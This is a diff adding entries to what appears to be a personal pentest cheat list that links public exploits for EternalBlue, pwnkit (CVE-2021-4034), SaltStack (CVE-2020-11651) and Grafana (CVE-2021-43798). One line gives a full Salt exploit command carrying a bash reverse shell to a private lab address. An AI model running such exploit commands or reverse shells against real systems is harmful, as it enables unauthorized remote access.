@@ -3,3 +3,6 @@
 eternalblue-ms17-010	https://github.com/k4u5h41/MS17-010_CVE-2017-0143
 winodws xp PE		https://sohvaxus.github.io/content/winxp-sp1-privesc.html
 mssql injection		https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/	
+CVE-2021-4034		https://github.com/joeammond/CVE-2021-4034
+CVE-2020-11651		https://github.com/dozernz/cve-2020-11651 (ZeroMQ python3 exploit.py 192.168.120.121 master 'bash -i >& /dev/tcp/192.168.118.2/4505 0>&1')
+CVE-2021-43798		https://github.com/jas502n/Grafana-CVE-2021-43798
